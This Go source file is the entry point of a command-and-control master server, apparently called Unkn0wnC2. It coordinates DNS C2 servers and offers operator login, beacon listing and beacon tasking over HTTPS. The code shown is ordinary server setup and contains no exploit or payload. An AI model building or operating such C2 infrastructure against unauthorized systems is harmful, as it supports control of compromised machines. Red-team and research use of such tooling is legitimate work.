// Package main implements the Unkn0wnC2 Master Server entry point.
// This server provides centralized command and control for distributed DNS C2 servers,
// offering a WebUI and HTTPS API for multi-operator team collaboration.
package main

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/gorilla/mux"
)

// Build-time version information (set via -ldflags during build)
var (
	version   = "0.3.0-shadow-mesh"
	buildDate = "unknown"
	gitCommit = "unknown"
)

func main() {
	// Parse command line flags
	debugFlag := flag.Bool("debug", false, "Enable debug mode")
	generateConfig := flag.Bool("generate-config", false, "Generate example configuration file")
	configPath := flag.String("config", "/opt/unkn0wnc2/master_config.json", "Path to configuration file")
	bindAddr := flag.String("bind-addr", "", "Override bind address (e.g., 0.0.0.0 or 192.168.1.100)")
	bindPort := flag.Int("bind-port", 0, "Override bind port (e.g., 8443)")
	flag.Parse()

	// Generate example config and exit if requested
	if *generateConfig {
		if err := GenerateExampleConfig(*configPath); err != nil {
			fmt.Fprintf(os.Stderr, "Failed to generate config: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("✓ Generated example configuration: %s\n", *configPath)
		fmt.Println("⚠️  IMPORTANT: Edit this file and change default passwords and secrets!")
		os.Exit(0)
	}

	// Display banner
	printBanner()

	// Load configuration
	cfg, err := LoadConfig(*configPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to load config: %v\n", err)
		os.Exit(1)
	}

	// Override with command line flags
	if *debugFlag {
		cfg.Debug = true
	}
	if *bindAddr != "" {
		cfg.BindAddr = *bindAddr
		fmt.Printf("✓ Overriding bind address: %s\n", *bindAddr)
	}
	if *bindPort != 0 {
		cfg.BindPort = *bindPort
		fmt.Printf("✓ Overriding bind port: %d\n", *bindPort)
	}

	// Validate configuration
	if err := ValidateConfig(cfg); err != nil {
		fmt.Fprintf(os.Stderr, "Configuration validation failed: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Configuration loaded from: %s\n", *configPath)
	fmt.Printf("Bind address: %s:%d\n", cfg.BindAddr, cfg.BindPort)
	fmt.Printf("TLS Certificate: %s\n", cfg.TLSCert)
	fmt.Printf("Database: %s\n", cfg.DatabasePath)
	fmt.Printf("Debug mode: %v\n", cfg.Debug)
	fmt.Println()

	// Initialize database
	fmt.Println("Initializing database...")
	db, err := NewMasterDatabase(cfg.DatabasePath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to initialize database: %v\n", err)
		os.Exit(1)
	}
	defer db.Close()

	// Check if initial admin setup is needed
	if err := initializeAdmin(db, cfg); err != nil {
		fmt.Fprintf(os.Stderr, "Failed to initialize admin: %v\n", err)
		os.Exit(1)
	}

	// Register pre-configured DNS servers
	if err := registerConfiguredDNSServers(db, cfg); err != nil {
		fmt.Fprintf(os.Stderr, "Failed to register DNS servers: %v\n", err)
		// Don't exit - this is not critical
	}

	// Create API server
	apiServer := NewAPIServer(db, cfg)

	// Setup router
	router := mux.NewRouter()

	// Apply logging middleware to all routes
	router.Use(apiServer.loggingMiddleware)

	// Setup API routes
	apiServer.SetupRoutes(router)

	// TODO: Setup WebSocket endpoint for real-time updates
	// router.HandleFunc("/ws", handleWebSocket).Methods("GET")

	// Create HTTPS server
	addr := fmt.Sprintf("%s:%d", cfg.BindAddr, cfg.BindPort)
	srv := &http.Server{
		Addr:         addr,
		Handler:      router,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	// Start server in a goroutine
	go func() {
		fmt.Printf("\n%s==================================================%s\n", ColorGreen, ColorReset)
		fmt.Printf("%sMaster Server v%s%s\n", ColorGreen, version, ColorReset)
		fmt.Printf("Build: %s (commit: %s)\n", buildDate, gitCommit)
		fmt.Printf("%s==================================================%s\n", ColorGreen, ColorReset)
		fmt.Printf("🌐 HTTPS Server listening on: https://%s\n", addr)
		fmt.Printf("🔐 TLS enabled with certificate: %s\n", cfg.TLSCert)
		fmt.Printf("📊 Database: %s\n", cfg.DatabasePath)
		fmt.Printf("👥 DNS Servers registered: %d\n", len(cfg.DNSServers))

		// Display registered DNS servers
		if len(cfg.DNSServers) > 0 {
			fmt.Println("\nRegistered DNS Servers:")
			for _, dns := range cfg.DNSServers {
				status := "✓"
				if !dns.Enabled {
					status = "✗"
				}
				fmt.Printf("  %s %s - %s (%s)\n", status, dns.ID, dns.Domain, dns.Address)
			}
		}

		fmt.Println()
		fmt.Println("API Endpoints:")
		fmt.Println("  POST   /api/auth/login        - Operator authentication")
		fmt.Println("  GET    /api/beacons           - List all beacons")
		fmt.Println("  GET    /api/tasks             - List all tasks")
		fmt.Println("  POST   /api/beacons/:id/task  - Create task for beacon")
		fmt.Println("  POST   /api/dns-server/*      - DNS server endpoints (API key auth)")
		fmt.Println("  GET    /health                - Health check")
		fmt.Println()
		fmt.Printf("%sPress Ctrl+C to shutdown gracefully%s\n", ColorYellow, ColorReset)
		fmt.Println()

		// Start HTTPS server
		if err := srv.ListenAndServeTLS(cfg.TLSCert, cfg.TLSKey); err != nil && err != http.ErrServerClosed {
			fmt.Fprintf(os.Stderr, "Failed to start HTTPS server: %v\n", err)
			os.Exit(1)
		}
	}()

	// Wait for interrupt signal for graceful shutdown
	quit := make(chan os.Signal, 1)
	signal.Notify(quit, os.Interrupt, syscall.SIGTERM)
	<-quit

	fmt.Println("\n🛑 Shutting down Master Server...")

	// Create shutdown context with timeout
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Shutdown HTTP server gracefully
	if err := srv.Shutdown(ctx); err != nil {
		fmt.Fprintf(os.Stderr, "Server shutdown error: %v\n", err)
	}

	// Close database connection
	if err := db.Close(); err != nil {
		fmt.Fprintf(os.Stderr, "Database close error: %v\n", err)
	}

	fmt.Println("✓ Master Server stopped gracefully")
}

// initializeAdmin creates the initial admin account if it doesn't exist
func initializeAdmin(db *MasterDatabase, cfg Config) error {
	// Generate admin ID
	adminID := generateID()

	// Try to create admin account
	err := db.CreateOperator(
		adminID,
		cfg.AdminCredentials.Username,
		cfg.AdminCredentials.Password,
		"admin",
		"",
	)

	if err != nil {
		// If error is about duplicate username, admin already exists
		if err.Error() == "UNIQUE constraint failed: operators.username" {
			fmt.Println("✓ Admin account already exists")
			return nil
		}
		return fmt.Errorf("failed to create admin account: %w", err)
	}

	fmt.Printf("✓ Created admin account: %s\n", cfg.AdminCredentials.Username)
	fmt.Printf("⚠️  Default password is set - please change it after first login!\n")

	return nil
}

// registerConfiguredDNSServers registers DNS servers from configuration
func registerConfiguredDNSServers(db *MasterDatabase, cfg Config) error {
	for _, dnsConfig := range cfg.DNSServers {
		if !dnsConfig.Enabled {
			continue
		}

		err := db.RegisterDNSServer(
			dnsConfig.ID,
			dnsConfig.Domain,
			dnsConfig.Address,
			dnsConfig.APIKey,
		)

		if err != nil {
			fmt.Printf("⚠️  Warning: Failed to register DNS server %s: %v\n", dnsConfig.ID, err)
			continue
		}

		if cfg.Debug {
			fmt.Printf("✓ Registered DNS server: %s (%s)\n", dnsConfig.ID, dnsConfig.Domain)
		}
	}

	return nil
}

// generateID generates a random unique identifier
func generateID() string {
	bytes := make([]byte, 16)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

// printBanner displays the Master Server ASCII art banner
func printBanner() {
	fmt.Println(ColorRed)
	fmt.Println("  _    _       _           ___                    _____ ___  ")
	fmt.Println(" | |  | |     | |         / _ \\                  / ____|__ \\ ")
	fmt.Println(" | |  | |_ __ | | ___ __ | | | |_      ___ __   | |       ) |")
	fmt.Println(" | |  | | '_ \\| |/ / '_ \\| | | \\ \\ /\\ / / '_ \\  | |      / / ")
	fmt.Println(" | |__| | | | |   <| | | | |_| |\\ V  V /| | | | | |____ / /_ ")
	fmt.Println("  \\____/|_| |_|_|\\_\\_| |_|\\___/  \\_/\\_/ |_| |_|  \\_____|____|")
	fmt.Println(ColorReset)
	fmt.Println(ColorGreen + "                    MASTER SERVER" + ColorReset)
	fmt.Println()
}

// ANSI color codes for terminal output
const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[0;31m"
	ColorGreen  = "\033[0;32m"
	ColorYellow = "\033[0;33m"
	ColorBlue   = "\033[0;34m"
)
